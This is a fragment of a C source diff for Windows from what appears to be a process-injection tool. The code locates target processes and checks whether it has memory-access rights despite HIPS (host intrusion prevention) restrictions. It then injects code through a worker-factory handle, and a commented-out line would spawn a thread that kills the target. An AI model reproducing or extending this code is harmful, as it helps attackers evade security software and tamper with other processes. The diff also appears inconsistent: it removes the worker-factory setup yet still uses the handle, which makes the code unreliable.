+			status = NtDuplicateObject(hProcess, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE, &hProcess, PROCESS_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0);
+			dispError(0xC0000100);
 			status = NtQueryObject(hProcess, ObjectBasicInformation, &processHandleInfo, sizeof(OBJECT_BASIC_INFORMATION), &obQueryLen);
 			if (status)		///Not sure if this call ever will fail...
 				continue;
 
 			///Maybe, HIPS just wanted to deny PROCESS_TERMINATE/PROCESS_SUSPEND right?
 			///If so, we don't care. We're only interested in VM rights.
-			if ((MIN_VM_ACCESS_MASK | PROCESS_DUP_HANDLE) & ~processHandleInfo.GrantedAccess)
+			if ((MIN_VM_ACCESS_MASK | PROCESS_DUP_HANDLE) & ~processHandleInfo.GrantedAccess) {
+				dispError(0xC0000022);
 				continue;
+			}
+			//NtCreateT
+				//continue;
+			//status = NtCreateThreadEx(&hProcess, THREAD_ALL_ACCESS, &procAtttr, hProcess, (LPTHREAD_START_ROUTINE)&NtTerminateProcess, (PVOID)INVALID_HANDLE_VALUE, FALSE, 0, 0, 0, NULL);
+			//dispError(0xC0000101);
 
-			status = openWorkerFactory(&hWorkerFactory, hProcess, cid.UniqueProcess);
-			if (status)
-				continue;
-
-			status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForWorkViaWorkerFactory + 8, 10);
+			dispError(0xC0000101);
+			status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForWorkViaWorkerFactory);
 			if (!status) {
 				injectionSucceeded = TRUE;
 				break;
@@ -404,7 +815,7 @@ void mymain(void){
 	interval.QuadPart = -20000000;
 	//do {
 		//do {
-			status = openProcsByName(&hProcess, &uProcess, TRUE);
+			status = openProcsByName(&hProcess, &uProcess, FALSE);
 			//NtDelayExecution(FALSE, &interval);
 		//} while (!status);
 		if (status)
